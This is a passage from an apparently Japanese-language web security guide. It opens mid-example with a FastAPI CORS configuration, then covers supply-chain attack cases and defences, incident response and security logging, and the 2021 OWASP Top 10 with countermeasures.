    ALLOWED_ORIGINS.append("http://localhost:3000")

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,       # 許可するオリジン
    allow_credentials=True,              # Cookie/認証ヘッダーの送信許可
    allow_methods=["GET", "POST", "PUT", "DELETE"],  # 許可するHTTPメソッド
    allow_headers=["Authorization", "Content-Type"],   # 許可するヘッダー
    expose_headers=["X-Request-Id"],     # クライアントに公開するレスポンスヘッダー
    max_age=86400,                       # プリフライトキャッシュ（秒）
)
```

---

## 8. サプライチェーン攻撃

```
サプライチェーン攻撃:
  → 依存ライブラリや開発ツールを経由した攻撃

  事例:
  ① event-stream（2018）:
     → npmパッケージにマルウェアが混入
     → 暗号通貨ウォレットの窃取を目的

  ② SolarWinds（2020）:
     → ビルドシステムにバックドアを挿入
     → 更新を通じて18,000組織に配布

  ③ ua-parser-js（2021）:
     → 人気npmパッケージのアカウント乗っ取り
     → 暗号マイナーとパスワード窃取ツールを含む版を公開

  ④ Log4Shell（2021）:
     → Log4jの脆弱性（CVE-2021-44228）
     → JNDI Injection によるRCE

  防御策:
  ✓ 依存パッケージの監査
     npm audit / yarn audit / pip-audit
  ✓ ロックファイルの使用（package-lock.json, Pipfile.lock）
  ✓ 依存パッケージの固定（^ → = へ）
  ✓ Dependabot / Renovate で自動更新
  ✓ SCA（Software Composition Analysis）ツール
     Snyk, Trivy, Grype
  ✓ SBOMの生成と管理
  ✓ 署名の検証（Sigstore, npm provenance）
  ✓ プライベートレジストリの利用
```

---

## 9. インシデント対応

```
インシデント対応フロー:

  ① 検知（Detection）:
     → 監視アラート、ログ分析、ユーザー報告
     → SIEM（Security Information and Event Management）
     → 異常トラフィックパターンの検出

  ② トリアージ（Triage）:
     → 影響範囲の特定
     → 重要度の分類（P1〜P4）
     → 対応チームの招集

  ③ 封じ込め（Containment）:
     → 被害拡大の防止
     → 侵害されたアカウントの無効化
     → 影響を受けたサービスの隔離
     → ネットワークセグメントの切断

  ④ 根本原因分析（Root Cause Analysis）:
     → ログの詳細調査
     → 攻撃経路の特定
     → タイムラインの再構成

  ⑤ 復旧（Recovery）:
     → パッチ適用
     → パスワード/鍵のローテーション
     → サービスの段階的復旧
     → 監視の強化

  ⑥ 事後対応（Post-Incident）:
     → インシデントレポートの作成
     → 振り返り（ポストモーテム）
     → 再発防止策の実施
     → セキュリティポリシーの更新

セキュリティログの設計:
  記録すべきイベント:
  → 認証の成功/失敗
  → 認可の拒否
  → 入力バリデーション失敗
  → アプリケーションエラー
  → 管理者操作
  → データアクセス（読み取り/変更/削除）

  ログに含めるべき情報:
  → タイムスタンプ（UTC）
  → イベント種類
  → ソースIP、ユーザーID
  → リクエストパス、メソッド
  → ステータスコード
  → User-Agent

  ログに含めてはいけない情報:
  → パスワード（ハッシュ化前）
  → セッショントークン
  → クレジットカード番号
  → 個人識別情報（PII）のうち不要なもの
```

---

## 10. OWASP Top 10（2021）

```
OWASP Top 10 Web Application Security Risks（2021）:

  A01: Broken Access Control（アクセス制御の不備）
    → 権限チェックの漏れ、IDOR
    → 対策: 認可チェックの一元化、テスト

  A02: Cryptographic Failures（暗号化の失敗）
    → 機密データの平文送信/保存
    → 対策: TLS必須化、適切な暗号化

  A03: Injection（インジェクション）
    → SQLi, XSS, コマンドインジェクション
    → 対策: パラメータ化、エスケープ、WAF

  A04: Insecure Design（安全でない設計）
    → 設計段階でのセキュリティ欠如
    → 対策: 脅威モデリング、セキュアデザインパターン

  A05: Security Misconfiguration（セキュリティの設定ミス）
    → デフォルト設定、不要な機能の有効化
    → 対策: ハードニング、定期的な設定レビュー

  A06: Vulnerable and Outdated Components（脆弱なコンポーネント）
    → 既知の脆弱性を持つライブラリの使用
    → 対策: 依存管理、SCA、自動更新

  A07: Identification and Authentication Failures（認証の失敗）
    → ブルートフォース、弱いパスワード、セッション管理不備
    → 対策: MFA、レート制限、安全なセッション管理

  A08: Software and Data Integrity Failures（ソフトウェア/データの整合性）
    → サプライチェーン攻撃、CI/CDパイプラインの侵害
    → 対策: 署名検証、SBOM、コードレビュー

  A09: Security Logging and Monitoring Failures（ログ/監視の不備）
    → 攻撃の検知ができない
    → 対策: 包括的なログ、SIEM、アラート

  A10: Server-Side Request Forgery（SSRF）
    → 内部リソースへの不正アクセス
    → 対策: URLバリデーション、ネットワーク制限
```

---

## まとめ

| 攻撃 | 防御 |
|------|------|
| MITM | HTTPS + HSTS + HSTS Preload |
| DNS汚染 | DNSSEC + レジストラ保護 |
| DDoS | CDN/WAF + レート制限 + Anycast |
| XSS | CSP + エスケープ + HttpOnly + Trusted Types |
| CSRF | CSRFトークン + SameSite Cookie |
| SQLi | Prepared Statement + ORM |
| SSRF | URLホワイトリスト + IP検証 + IMDSv2 |
| CORS | 明示的なオリジン許可 |
| サプライチェーン | 依存監査 + SCA + SBOM |
| 設定ミス | セキュリティヘッダー + ハードニング |

---

## 次に読むべきガイド
→ [[../04-advanced/00-load-balancing.md]] — ロードバランシング

---

## 参考文献
1. OWASP. "OWASP Top 10." 2021.
2. NIST. "SP 800-53: Security and Privacy Controls." 2020.
3. NIST. "SP 800-61: Computer Security Incident Handling Guide." 2012.
4. RFC 7617. "The 'Basic' HTTP Authentication Scheme." IETF, 2015.
5. RFC 6454. "The Web Origin Concept." IETF, 2011.
6. W3C. "Content Security Policy Level 3." 2023.
7. Cloudflare. "DDoS Attack Trends." 2024.
8. OWASP. "Cross-Site Scripting Prevention Cheat Sheet." 2024.
9. OWASP. "SQL Injection Prevention Cheat Sheet." 2024.
10. OWASP. "Server-Side Request Forgery Prevention Cheat Sheet." 2024.
